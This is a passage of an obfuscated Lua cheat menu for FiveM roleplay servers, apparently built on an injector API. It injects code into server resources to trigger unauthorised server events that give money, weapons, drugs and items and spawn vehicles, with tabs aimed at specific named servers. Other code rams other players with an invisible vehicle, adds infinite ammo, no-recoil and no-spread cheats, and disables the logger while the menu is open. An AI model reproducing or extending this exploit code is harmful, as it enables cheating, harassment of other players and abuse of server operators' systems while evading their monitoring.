                ]],v880.amount));MachoMenuNotification("Success","Money exploit executed!");else MachoMenuNotification("Error","Please enter a valid money amount!");end end);v653=3;end if (v653==(0 -0)) then v654=MachoMenuAddTab(v4,"Rac10 Exploits");v655=MachoMenuGroup(v654,"Rac10 Exploits",v3,23 -14 ,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v655,"Vehicle Exploit");v653=1 + 0 ;end if (v653==(2 + 1)) then MachoMenuText(v655,"Item Exploit");v659=MachoMenuInputbox(v655,"Item Code","e.g., weapon_pistol");MachoMenuButton(v655,"Give Item",function() local v881=0;local v882;while true do if (v881==(0 -0)) then v882=MachoMenuGetInputbox(v659) or "weapon_pistol" ;if (v882~="") then MachoInjectResource("monitor",string.format([[ 
                    QBCore.Functions.TriggerCallback('bz:itemsver', function(item)
                    end, '%s')
                ]],v882));MachoMenuNotification("Success","Item exploit executed!");else MachoMenuNotification("Error","Please enter a valid item code!");end break;end end end);break;end if (v653==(1 + 0)) then v656=MachoMenuInputbox(v655,"Vehicle Model","e.g., hakuchou");v657=MachoMenuInputbox(v655,"Plate","e.g., 34AKP952");MachoMenuButton(v655,"Spawn Vehicle",function() local v883=0 + 0 ;local v884;while true do if (v883==0) then v884={model=MachoMenuGetInputbox(v656) or "hakuchou" ,plate=MachoMenuGetInputbox(v657) or "34AKP952" };if (v884.model and (v884.model~="") and v884.plate and (v884.plate~="")) then MachoInjectResource("monitor",string.format([[ 
                    local model = "%s"
                    local plate = "%s"
                    local playerPed = PlayerPedId()
                    local spawnLoc = GetEntityCoords(playerPed)
                    local spawnHeading = GetEntityHeading(playerPed)
        
                    QBCore.Functions.SpawnVehicle(model, function(veh)
                        SetEntityHeading(veh, spawnHeading)
                        SetVehicleNumberPlateText(veh, plate)
                        TaskWarpPedIntoVehicle(playerPed, veh, -1)
                        SetVehicleEngineOn(veh, true, true)
                        Citizen.Wait(500)
                        TriggerEvent("bb_admin:client:SaveCar")
                    end, spawnLoc, true)
                ]],v884.model,v884.plate));MachoMenuNotification("Success","Vehicle spawned!");else MachoMenuNotification("Error","Please enter a valid vehicle model and plate!");end break;end end end);v653=2;end end end if v415:find("Xen Roleplay") then local v660=0 -0 ;local v661;local v662;local v663;local v664;while true do if (v660==1) then v663=MachoMenuInputbox(v662,"Item Name","...");v664=MachoMenuInputbox(v662,"Amount","1");v660=1 + 1 ;end if (v660==0) then v661=MachoMenuAddTab(v4,"Xen Roleplay");v662=MachoMenuGroup(v661,"Xen Roleplay",v3,9,(v1.x-v3) + 150 ,v1.y);v660=1020 -(829 + 190) ;end if ((7 -5)==v660) then MachoMenuButton(v662,"Add Item",function() local v885=0 -0 ;local v886;while true do if (v885==(0 -0)) then v886={item=MachoMenuGetInputbox(v663),amount=tonumber(MachoMenuGetInputbox(v664)) or 1 };if (v886.item and (v886.item~="") and (v886.amount>0)) then MachoInjectResource("savana-restaurant",string.format([[
                    TriggerServerEvent('savana-restaurant:giveItem', "%s", %d)
                ]],v886.item,v886.amount,v886.item,v886.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end break;end end end);break;end end end if v415:find("HotV") then local v665=MachoMenuAddTab(v4,"HotV");local v666=MachoMenuGroup(v665,"HotV Item",v3,21 -12 ,(v1.x-v3) + 36 + 114 ,v1.y);local v667=MachoMenuInputbox(v666,"Code Name","Example: item_code");local v668=MachoMenuInputbox(v666,"Code Amount","Example: 3");MachoMenuButton(v666,"Item Exploit",function() local v735=0 + 0 ;local v736;local v737;while true do if (v735==(5 -3)) then MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v736,v737));break;end if (v735==1) then if ( not v736 or (v736=="")) then local v924=0 + 0 ;while true do if (v924==0) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v737 or (v737<=0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end v735=615 -(520 + 93) ;end if (v735==(276 -(259 + 17))) then v736=MachoMenuGetInputbox(v667);v737=tonumber(MachoMenuGetInputbox(v668));v735=1 + 0 ;end end end);local v669=MachoMenuInputbox(v666,"Name","Name to appear in yellow pages");local v670=MachoMenuInputbox(v666,"Phone Number","Example: 123-456-7890");local v671=MachoMenuInputbox(v666,"Message","Text to appear in yellow pages");MachoMenuButton(v666,"Send to Yellow Pages",function() local v738=0 + 0 ;local v739;local v740;local v741;while true do if (v738==(0 -0)) then v739=MachoMenuGetInputbox(v669);v740=MachoMenuGetInputbox(v670);v738=592 -(396 + 195) ;end if (v738==3) then TriggerServerEvent("gksphone:yellow_postPagess",v739,v740,v741,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");break;end if (v738==(5 -3)) then if ( not v740 or (v740=="")) then local v925=0;while true do if (v925==(1761 -(440 + 1321))) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v741 or (v741=="")) then MachoMenuNotification("Error","Please enter a message!");return;end v738=1832 -(1059 + 770) ;end if (v738==(4 -3)) then v741=MachoMenuGetInputbox(v671);if ( not v739 or (v739=="")) then local v926=545 -(424 + 121) ;while true do if ((0 + 0)==v926) then MachoMenuNotification("Error","Please enter a name!");return;end end end v738=1349 -(641 + 706) ;end end end);end if v415:find("Black Roleplay") then local v672=0 + 0 ;local v673;local v674;local v675;local v676;while true do if ((442 -(249 + 191))==v672) then MachoMenuButton(v674,"Give Item",function() local v887=0 -0 ;local v888;local v889;while true do if (v887==(1 + 0)) then if ((v888~="") and (v889>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("jim-consumables:server:toggleItem", -1, "%s", %d) 
                ]],v888,v889,v888,v889));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v887==(427 -(183 + 244))) then v888=MachoMenuGetInputbox(v675);v889=tonumber(MachoMenuGetInputbox(v676)) or (1 + 0) ;v887=1;end end end);break;end if (v672==(730 -(434 + 296))) then v673=MachoMenuAddTab(v4,"Black Roleplay");v674=MachoMenuGroup(v673,"Item Exploit",v3,0 -0 ,(v1.x-v3) + (662 -(169 + 343)) ,132 + 18 );v672=1 -0 ;end if (v672==(2 -1)) then v675=MachoMenuInputbox(v674,"Item Code","e.g., sandwich");v676=MachoMenuInputbox(v674,"Amount","e.g., 3");v672=2 + 0 ;end end end end);Citizen.CreateThread(function() local v417=0 -0 ;while true do if (v417==(1123 -(651 + 472))) then MachoLockLogger();while v5 do if MachoMenuIsOpen(v4) then if (MachoGetLoggerState()~=(0 + 0)) then MachoSetLoggerState(0);MachoLockLogger();MachoMenuNotification("Error","Logger cannot be active while using the menu!");end end Citizen.Wait(0);end break;end end end);function ShowGTAStyleInput(v418,v419,v420,v421) local v422=0 + 0 ;while true do if (v422==1) then if GetOnscreenKeyboardResult() then local v828=GetOnscreenKeyboardResult();v421(v828);end break;end if (v422==(0 -0)) then DisplayOnscreenKeyboard(484 -(397 + 86) ,v418,"",v419,"","","",v420);while UpdateOnscreenKeyboard()==(876 -(423 + 453))  do Wait(0);end v422=1 + 0 ;end end end function GetPlayerServerIdByName(v423) local v424=0 + 0 ;local v425;while true do if ((0 + 0)==v424) then v425=nil;for v762=0 + 0 ,228 + 27  do if NetworkIsPlayerActive(v762) then local v890=GetPlayerServerId(v762);local v891=GetPlayerName(v762);if (v891==v423) then v425=v890;break;end end end v424=1;end if (v424==(1191 -(50 + 1140))) then return v425;end end end function RamPlayer(v426) local v427=GetPlayerFromServerId(v426);if v427 then local v677=GetPlayerPed(v427);local v678=GetEntityCoords(v677);local v679=GetOffsetFromEntityInWorldCoords(v677,0 + 0 , -2,0 + 0 );local v680="futo";RequestModel(v680);while  not HasModelLoaded(v680) do Citizen.Wait(0);end local v681=CreateVehicle(v680,v679.x,v679.y,v679.z,GetEntityHeading(v677),true,true);SetEntityVisible(v681,false,true);if DoesEntityExist(v681) then local v763=0 + 0 ;while true do if (v763==1) then SetVehicleForwardSpeed(v681,172 -52 );break;end if (v763==0) then NetworkRequestControlOfEntity(v681);SetVehicleDoorsLocked(v681,3 + 1 );v763=597 -(157 + 439) ;end end end else MachoMenuNotification("Error","Player with ID "   .. v426   .. " not found." );end end function DrawPlayerServerIds() for v508=0 -0 ,255 do if NetworkIsPlayerActive(v508) then local v742=0 -0 ;local v743;local v744;local v745;local v746;local v747;local v748;while true do if (v742==2) then v748=v748 + 1 ;DrawText3D(v746,v747,v748,tostring(v744));break;end if (v742==(2 -1)) then v745=GetEntityCoords(v743);v746,v747,v748=table.unpack(v745);v742=920 -(782 + 136) ;end if (v742==(855 -(112 + 743))) then v743=GetPlayerPed(v508);v744=GetPlayerServerId(v508);v742=1172 -(1026 + 145) ;end end end end end function DrawText3D(v428,v429,v430,v431) local v432,v433,v434=World3dToScreen2d(v428,v429,v430);if v432 then local v682=0;while true do if (v682==3) then AddTextComponentString(v431);DrawText(v433,v434);break;end if ((0 + 0)==v682) then SetTextScale(0.35,718.35 -(493 + 225) );SetTextFont(4);v682=3 -2 ;end if (v682==1) then SetTextProportional(1 + 0 );SetTextColour(683 -428 ,5 + 250 ,728 -473 ,63 + 152 );v682=2;end if (v682==(2 -0)) then SetTextEntry("STRING");SetTextCentre(1596 -(210 + 1385) );v682=1692 -(1201 + 488) ;end end end end Citizen.CreateThread(function() while true do local v509=0 + 0 ;while true do if (v509==0) then Citizen.Wait(0 -0 );if v11 then DrawPlayerServerIds();end break;end end end end);local v168=MachoMenuAddTab(v4,"Easy Spawn");local v169=MachoMenuGroup(v168,"Easy Spawn",v3,15 -6 ,(v1.x-v3) + (735 -(352 + 233)) ,v1.y);local function v170(v435,v436,v437) local v438=0 -0 ;while true do if (v438==(0 + 0)) then v436=v436 or (2 -1) ;v437=v437 or "lumberjack" ;v438=575 -(489 + 85) ;end if (v438==(1502 -(277 + 1224))) then if (v437=="lumberjack") then TriggerServerEvent("rt-lumberjack:server:giveItem",v435,v436);MachoMenuNotification("Easy Spawn","Spawned "   .. v435   .. " x"   .. v436 );print("[Easy Spawn] Spawned "   .. v435   .. " x"   .. v436 );elseif (v437=="steal") then local v904=1493 -(663 + 830) ;local v905;while true do if (v904==(1 + 0)) then if  not v905 then local v958=0 -0 ;local v959;while true do if (0==v958) then v959=nil;if (GetResourceState("rt-steal")=="started") then v959="rt-steal";elseif (GetResourceState("monitor")=="started") then v959="monitor";elseif (GetResourceState("qb-core")=="started") then v959="qb-core";else v959="ox_inventory";end v958=876 -(461 + 414) ;end if (v958==1) then MachoInjectResource2(NewThreadNs,v959,string.format([[
                local itemName = "%s"
                local amount = %d
                TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
            ]],v435,v436));break;end end end MachoMenuNotification("Easy Spawn","Spawned "   .. v435   .. " x"   .. v436 );v904=1 + 1 ;end if (v904==2) then print("[Easy Spawn] Spawned "   .. v435   .. " x"   .. v436 );break;end if (v904==(0 + 0)) then v905=false;pcall(function() local v954=0 + 0 ;while true do if (v954==(0 + 0)) then TriggerServerEvent("rt-steal:server:giveItem",v435,v436);v905=true;break;end end end);v904=251 -(172 + 78) ;end end end break;end end end MachoMenuText(v169,"WEAPONS (RT Steal)");MachoMenuButton(v169,"Pistol",function() v170("weapon_pistol",1 -0 ,"steal");end);MachoMenuButton(v169,"Combat Pistol",function() v170("weapon_combatpistol",1 + 0 ,"steal");end);MachoMenuButton(v169,"AP Pistol",function() v170("weapon_appistol",1,"steal");end);MachoMenuButton(v169,"Pistol 50",function() v170("weapon_pistol50",1 -0 ,"steal");end);MachoMenuButton(v169,"SMG",function() v170("weapon_smg",1,"steal");end);MachoMenuButton(v169,"Micro SMG",function() v170("weapon_microsmg",1 + 0 ,"steal");end);MachoMenuButton(v169,"Assault SMG",function() v170("weapon_assaultsmg",1,"steal");end);MachoMenuButton(v169,"Assault Rifle",function() v170("weapon_assaultrifle",1,"steal");end);MachoMenuButton(v169,"Carbine Rifle",function() v170("weapon_carbinerifle",1,"steal");end);MachoMenuButton(v169,"Advanced Rifle",function() v170("weapon_advancedrifle",1,"steal");end);MachoMenuButton(v169,"Pump Shotgun",function() v170("weapon_pumpshotgun",1,"steal");end);MachoMenuButton(v169,"Sawed Off Shotgun",function() v170("weapon_sawnoffshotgun",1 + 0 ,"steal");end);MachoMenuButton(v169,"Assault Shotgun",function() v170("weapon_assaultshotgun",1 -0 ,"steal");end);MachoMenuButton(v169,"Sniper Rifle",function() v170("weapon_sniperrifle",1,"steal");end);MachoMenuButton(v169,"Heavy Sniper",function() v170("weapon_heavysniper",1 -0 ,"steal");end);MachoMenuButton(v169,"RPG",function() v170("weapon_rpg",1 + 0 ,"steal");end);MachoMenuButton(v169,"Minigun",function() v170("weapon_minigun",1 + 0 ,"steal");end);MachoMenuButton(v169,"Grenade Launcher",function() v170("weapon_grenadelauncher",1,"steal");end);MachoMenuButton(v169,"Railgun",function() v170("weapon_railgun",1 + 0 ,"steal");end);MachoMenuButton(v169,"Stun Gun (Taser)",function() v170("weapon_stungun",3 -2 ,"steal");end);MachoMenuButton(v169,"Knife",function() v170("weapon_knife",2 -1 ,"steal");end);MachoMenuButton(v169,"Bat",function() v170("weapon_bat",1 + 0 ,"steal");end);MachoMenuText(v169,"ITEMS (RT Steal)");MachoMenuButton(v169,"Lockpick",function() v170("lockpick",3 + 2 ,"steal");end);MachoMenuButton(v169,"Advanced Lockpick",function() v170("advancedlockpick",452 -(133 + 314) ,"steal");end);MachoMenuButton(v169,"Handcuffs",function() v170("handcuffs",1 + 4 ,"steal");end);MachoMenuButton(v169,"Phone",function() v170("phone",1,"steal");end);MachoMenuButton(v169,"Drill",function() v170("drill",214 -(199 + 14) ,"steal");end);MachoMenuButton(v169,"Thermite",function() v170("thermite",10 -7 ,"steal");end);MachoMenuButton(v169,"Repair Kit",function() v170("repairkit",1554 -(647 + 902) ,"steal");end);MachoMenuButton(v169,"Bandage",function() v170("bandage",30 -20 ,"steal");end);MachoMenuButton(v169,"Painkillers",function() v170("painkillers",243 -(85 + 148) ,"steal");end);MachoMenuButton(v169,"Armor",function() v170("armor",1,"steal");end);MachoMenuText(v169,"DRUGS (RT Steal)");MachoMenuButton(v169,"Weed",function() v170("weed",10,"steal");end);MachoMenuButton(v169,"Cocaine",function() v170("cocaine",1299 -(426 + 863) ,"steal");end);MachoMenuButton(v169,"Meth",function() v170("meth",46 -36 ,"steal");end);MachoMenuButton(v169,"Crack",function() v170("crack",1664 -(873 + 781) ,"steal");end);MachoMenuButton(v169,"Heroin",function() v170("heroin",10,"steal");end);MachoMenuButton(v169,"Oxy",function() v170("oxy",13 -3 ,"steal");end);MachoMenuText(v169,"AMMO (RT Steal)");MachoMenuButton(v169,"Pistol Ammo x100",function() v170("pistol_ammo",100,"steal");end);MachoMenuButton(v169,"SMG Ammo x100",function() v170("smg_ammo",100,"steal");end);MachoMenuButton(v169,"Rifle Ammo x100",function() v170("rifle_ammo",270 -170 ,"steal");end);MachoMenuButton(v169,"Shotgun Ammo x100",function() v170("shotgun_ammo",100,"steal");end);MachoMenuButton(v169,"Sniper Ammo x100",function() v170("sniper_ammo",42 + 58 ,"steal");end);MachoMenuButton(v169,"RPG Ammo x10",function() v170("rpg_ammo",36 -26 ,"steal");end);MachoMenuText(v169,"LUMBERJACK ITEMS");MachoMenuButton(v169,"Wood",function() v170("wood",71 -21 ,"lumberjack");end);MachoMenuButton(v169,"Plank",function() v170("plank",50,"lumberjack");end);MachoMenuButton(v169,"Log",function() v170("log",148 -98 ,"lumberjack");end);MachoMenuButton(v169,"Sawdust",function() v170("sawdust",1997 -(414 + 1533) ,"lumberjack");end);MachoMenuText(v169,"FOOD & DRINK (RT Steal)");MachoMenuButton(v169,"Water Bottle",function() v170("water_bottle",9 + 1 ,"steal");end);MachoMenuButton(v169,"Sandwich",function() v170("sandwich",10,"steal");end);MachoMenuButton(v169,"Burger",function() v170("burger",10,"steal");end);MachoMenuButton(v169,"Donut",function() v170("donut",10,"steal");end);MachoMenuButton(v169,"Coffee",function() v170("coffee",565 -(443 + 112) ,"steal");end);MachoMenuButton(v169,"Energy Drink",function() v170("energydrink",10,"steal");end);MachoMenuText(v169,"MISC ITEMS (RT Steal)");MachoMenuButton(v169,"Laptop",function() v170("laptop",1,"steal");end);MachoMenuButton(v169,"Hacking Device",function() v170("hacking_device",1480 -(888 + 591) ,"steal");end);MachoMenuButton(v169,"USB Drive",function() v170("usb_drive",12 -7 ,"steal");end);MachoMenuButton(v169,"Radio",function() v170("radio",1 + 0 ,"steal");end);MachoMenuButton(v169,"Binoculars",function() v170("binoculars",3 -2 ,"steal");end);MachoMenuButton(v169,"Scuba Gear",function() v170("scuba_gear",1 + 0 ,"steal");end);MachoMenuButton(v169,"Parachute",function() v170("parachute",1 + 0 ,"steal");end);print("[Easy Spawn] Tab loaded!");local v171=MachoMenuAddTab(v4,"Weapons");local v172=MachoMenuGroup(v171,"Weapon Options",v3,1 + 8 ,(v1.x-v3) + (285 -135) ,v1.y);local v173=463 -213 ;local function v174(v439,v440) v440=v440 or v173 ;local v441=GetHashKey(v439);if (v441 and (v441~=(1678 -(136 + 1542)))) then GiveWeaponToPed(PlayerPedId(),v441,v440,false,true);SetCurrentPedWeapon(PlayerPedId(),v441,true);MachoMenuNotification("Weapon","Spawned: "   .. v439 );print("[Weapon] Spawned: "   .. v439   .. " x"   .. v440 );else MachoMenuNotification("Error","Invalid weapon: "   .. v439 );end end MachoMenuText(v172,"MELEE WEAPONS");MachoMenuButton(v172,"Knife",function() v174("WEAPON_KNIFE",3 -2 );end);MachoMenuButton(v172,"Bat",function() v174("WEAPON_BAT",1 + 0 );end);MachoMenuButton(v172,"Hammer",function() v174("WEAPON_HAMMER",1 -0 );end);MachoMenuButton(v172,"Crowbar",function() v174("WEAPON_CROWBAR",1);end);MachoMenuButton(v172,"Golf Club",function() v174("WEAPON_GOLFCLUB",1 + 0 );end);MachoMenuButton(v172,"Machete",function() v174("WEAPON_MACHETE",487 -(68 + 418) );end);MachoMenuButton(v172,"Switchblade",function() v174("WEAPON_SWITCHBLADE",2 -1 );end);MachoMenuButton(v172,"Dagger",function() v174("WEAPON_DAGGER",1 -0 );end);MachoMenuButton(v172,"Hatchet",function() v174("WEAPON_HATCHET",1 + 0 );end);MachoMenuButton(v172,"Wrench",function() v174("WEAPON_WRENCH",1093 -(770 + 322) );end);MachoMenuButton(v172,"Nightstick",function() v174("WEAPON_NIGHTSTICK",1);end);MachoMenuButton(v172,"Bottle",function() v174("WEAPON_BOTTLE",1 + 0 );end);MachoMenuText(v172,"PISTOLS");MachoMenuButton(v172,"Pistol",function() v174("WEAPON_PISTOL");end);MachoMenuButton(v172,"Pistol MK2",function() v174("WEAPON_PISTOL_MK2");end);MachoMenuButton(v172,"Combat Pistol",function() v174("WEAPON_COMBATPISTOL");end);MachoMenuButton(v172,"AP Pistol",function() v174("WEAPON_APPISTOL");end);MachoMenuButton(v172,"Pistol 50",function() v174("WEAPON_PISTOL50");end);MachoMenuButton(v172,"Heavy Pistol",function() v174("WEAPON_HEAVYPISTOL");end);MachoMenuButton(v172,"SNS Pistol",function() v174("WEAPON_SNSPISTOL");end);MachoMenuButton(v172,"Vintage Pistol",function() v174("WEAPON_VINTAGEPISTOL");end);MachoMenuButton(v172,"Ceramic Pistol",function() v174("WEAPON_CERAMICPISTOL");end);MachoMenuButton(v172,"Flare Gun",function() v174("WEAPON_FLAREGUN");end);MachoMenuButton(v172,"Stun Gun (Taser)",function() v174("WEAPON_STUNGUN");end);MachoMenuButton(v172,"Revolver",function() v174("WEAPON_REVOLVER");end);MachoMenuButton(v172,"Double Action Revolver",function() v174("WEAPON_DOUBLEACTION");end);MachoMenuButton(v172,"Marksman Pistol",function() v174("WEAPON_MARKSMANPISTOL");end);MachoMenuText(v172,"SMGs");MachoMenuButton(v172,"SMG",function() v174("WEAPON_SMG");end);MachoMenuButton(v172,"SMG MK2",function() v174("WEAPON_SMG_MK2");end);MachoMenuButton(v172,"Micro SMG",function() v174("WEAPON_MICROSMG");end);MachoMenuButton(v172,"Assault SMG",function() v174("WEAPON_ASSAULTSMG");end);MachoMenuButton(v172,"Combat PDW",function() v174("WEAPON_COMBATPDW");end);MachoMenuButton(v172,"Machine Pistol",function() v174("WEAPON_MACHINEPISTOL");end);MachoMenuButton(v172,"Mini SMG",function() v174("WEAPON_MINISMG");end);MachoMenuButton(v172,"Gusenberg Sweeper",function() v174("WEAPON_GUSENBERG");end);MachoMenuText(v172,"SHOTGUNS");MachoMenuButton(v172,"Pump Shotgun",function() v174("WEAPON_PUMPSHOTGUN");end);MachoMenuButton(v172,"Pump Shotgun MK2",function() v174("WEAPON_PUMPSHOTGUN_MK2");end);MachoMenuButton(v172,"Sawed Off Shotgun",function() v174("WEAPON_SAWNOFFSHOTGUN");end);MachoMenuButton(v172,"Assault Shotgun",function() v174("WEAPON_ASSAULTSHOTGUN");end);MachoMenuButton(v172,"Bullpup Shotgun",function() v174("WEAPON_BULLPUPSHOTGUN");end);MachoMenuButton(v172,"Heavy Shotgun",function() v174("WEAPON_HEAVYSHOTGUN");end);MachoMenuButton(v172,"Double Barrel Shotgun",function() v174("WEAPON_DBSHOTGUN");end);MachoMenuButton(v172,"Sweeper Shotgun",function() v174("WEAPON_AUTOSHOTGUN");end);MachoMenuText(v172,"RIFLES");MachoMenuButton(v172,"Assault Rifle",function() v174("WEAPON_ASSAULTRIFLE");end);MachoMenuButton(v172,"Assault Rifle MK2",function() v174("WEAPON_ASSAULTRIFLE_MK2");end);MachoMenuButton(v172,"Carbine Rifle",function() v174("WEAPON_CARBINERIFLE");end);MachoMenuButton(v172,"Carbine Rifle MK2",function() v174("WEAPON_CARBINERIFLE_MK2");end);MachoMenuButton(v172,"Advanced Rifle",function() v174("WEAPON_ADVANCEDRIFLE");end);MachoMenuButton(v172,"Special Carbine",function() v174("WEAPON_SPECIALCARBINE");end);MachoMenuButton(v172,"Special Carbine MK2",function() v174("WEAPON_SPECIALCARBINE_MK2");end);MachoMenuButton(v172,"Bullpup Rifle",function() v174("WEAPON_BULLPUPRIFLE");end);MachoMenuButton(v172,"Bullpup Rifle MK2",function() v174("WEAPON_BULLPUPRIFLE_MK2");end);MachoMenuButton(v172,"Compact Rifle",function() v174("WEAPON_COMPACTRIFLE");end);MachoMenuButton(v172,"Military Rifle",function() v174("WEAPON_MILITARYRIFLE");end);MachoMenuButton(v172,"Heavy Rifle",function() v174("WEAPON_HEAVYRIFLE");end);MachoMenuButton(v172,"Battle Rifle",function() v174("WEAPON_BATTLERIFLE");end);MachoMenuButton(v172,"Tactical Rifle",function() v174("WEAPON_TACTICALRIFLE");end);MachoMenuButton(v172,"MG",function() v174("WEAPON_MG");end);MachoMenuButton(v172,"Combat MG",function() v174("WEAPON_COMBATMG");end);MachoMenuButton(v172,"Combat MG MK2",function() v174("WEAPON_COMBATMG_MK2");end);MachoMenuText(v172,"SNIPERS");MachoMenuButton(v172,"Sniper Rifle",function() v174("WEAPON_SNIPERRIFLE");end);MachoMenuButton(v172,"Heavy Sniper",function() v174("WEAPON_HEAVYSNIPER");end);MachoMenuButton(v172,"Heavy Sniper MK2",function() v174("WEAPON_HEAVYSNIPER_MK2");end);MachoMenuButton(v172,"Marksman Rifle",function() v174("WEAPON_MARKSMANRIFLE");end);MachoMenuButton(v172,"Marksman Rifle MK2",function() v174("WEAPON_MARKSMANRIFLE_MK2");end);MachoMenuText(v172,"HEAVY WEAPONS");MachoMenuButton(v172,"RPG",function() v174("WEAPON_RPG",15 + 35 );end);MachoMenuButton(v172,"Minigun",function() v174("WEAPON_MINIGUN",500);end);MachoMenuButton(v172,"Grenade Launcher",function() v174("WEAPON_GRENADELAUNCHER",7 + 43 );end);MachoMenuButton(v172,"Compact Grenade Launcher",function() v174("WEAPON_COMPACTLAUNCHER",71 -21 );end);MachoMenuButton(v172,"Homing Launcher",function() v174("WEAPON_HOMINGLAUNCHER",96 -46 );end);MachoMenuButton(v172,"Railgun",function() v174("WEAPON_RAILGUN",50);end);MachoMenuButton(v172,"Firework Launcher",function() v174("WEAPON_FIREWORK",136 -86 );end);MachoMenuButton(v172,"Up-n-Atomizer",function() v174("WEAPON_RAYGUN",183 -133 );end);MachoMenuButton(v172,"Hellbringer",function() v174("WEAPON_RAYMINIGUN",500);end);MachoMenuButton(v172,"Widowmaker",function() v174("WEAPON_RAYCARBINE",279 + 221 );end);MachoMenuText(v172,"THROWABLES");MachoMenuButton(v172,"Grenade",function() v174("WEAPON_GRENADE",14 -4 );end);MachoMenuButton(v172,"Sticky Bomb",function() v174("WEAPON_STICKYBOMB",10);end);MachoMenuButton(v172,"Molotov Cocktail",function() v174("WEAPON_MOLOTOV",5 + 5 );end);MachoMenuButton(v172,"Pipe Bomb",function() v174("WEAPON_PIPEBOMB",7 + 3 );end);MachoMenuButton(v172,"Smoke Grenade",function() v174("WEAPON_SMOKEGRENADE",8 + 2 );end);MachoMenuButton(v172,"Proximity Mine",function() v174("WEAPON_PROXMINE",10);end);MachoMenuButton(v172,"BZ Gas",function() v174("WEAPON_BZGAS",37 -27 );end);MachoMenuText(v172,"TOGGLES");local v175=MachoMenuSlider(v172,"Ammo Quantity",v173,1 -0 ,3380 + 6619 ,"rds",46 -36 ,function(v442) v173=v442;end);local v176=false;MachoMenuCheckbox(v172,"Infinite Ammo",function() local v443=0 -0 ;while true do if (v443==(1 + 0)) then MachoMenuNotification("Ammo","Infinite Ammo ON");break;end if (v443==(0 -0)) then v176=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        infiniteAmmoActive = true
        CreateThread(function()
            while infiniteAmmoActive do
                Wait(0)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedAmmo(ped, weapon, 9999)
                    SetPedInfiniteAmmo(ped, true, weapon)
                    SetPedInfiniteAmmoClip(ped, true)
                end
            end
        end)
    ]]);v443=832 -(762 + 69) ;end end end,function() v176=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        infiniteAmmoActive = false
        local ped = PlayerPedId()
        local weapon = GetSelectedPedWeapon(ped)
        if weapon ~= nil and weapon ~= 0 then
            SetPedInfiniteAmmo(ped, false, weapon)
            SetPedInfiniteAmmoClip(ped, false)
        end
    ]]);MachoMenuNotification("Ammo","Infinite Ammo OFF");end);local v177=false;MachoMenuCheckbox(v172,"No Recoil",function() local v444=0 -0 ;while true do if (v444==0) then v177=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noRecoilActive = true
        CreateThread(function()
            while noRecoilActive do
                Wait(0)
                local cam = GetRenderingCam()
                StopGameplayCamShaking(true)
                if cam ~= 0 then
                    StopCamShaking(cam, true)
                end
                SetPedWeaponRecoilModifier(PlayerPedId(), 0.0)
                SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 0.0)
                SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
            end
        end)
    ]]);v444=1 + 0 ;end if (v444==(1 + 0)) then MachoMenuNotification("Recoil","No Recoil ON");break;end end end,function() local v445=0 -0 ;while true do if (v445==0) then v177=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noRecoilActive = false
        SetPedWeaponRecoilModifier(PlayerPedId(), 1.0)
        SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 1.0)
        StopGameplayCamShaking(false)
    ]]);v445=1 + 0 ;end if (v445==1) then MachoMenuNotification("Recoil","No Recoil OFF");break;end end end);local v178=false;MachoMenuCheckbox(v172,"No Reload",function() v178=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noReloadActive = true
        CreateThread(function()
            while noReloadActive do
                Wait(0)
                RefillAmmoInstantly(PlayerPedId())
            end
        end)
    ]]);MachoMenuNotification("Reload","No Reload ON");end,function() v178=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noReloadActive = false
    ]]);MachoMenuNotification("Reload","No Reload OFF");end);local v179=false;MachoMenuCheckbox(v172,"No Spread",function() local v446=0 + 0 ;while true do if (v446==(0 -0)) then v179=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noSpreadActive = true
        CreateThread(function()
            while noSpreadActive do
                Wait(0)
                SetPedAccuracy(PlayerPedId(), 100)
                SetPedWeaponAccuracyMultiplier(PlayerPedId(), 100.0)
                SetPedWeaponAccuracyModifier(PlayerPedId(), 100.0)
            end
        end)
    ]]);v446=158 -(8 + 149) ;end if (v446==(1321 -(1199 + 121))) then MachoMenuNotification("Spread","No Spread ON");break;end end end,function() v179=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noSpreadActive = false
        SetPedAccuracy(PlayerPedId(), 50)
        SetPedWeaponAccuracyMultiplier(PlayerPedId(), 1.0)
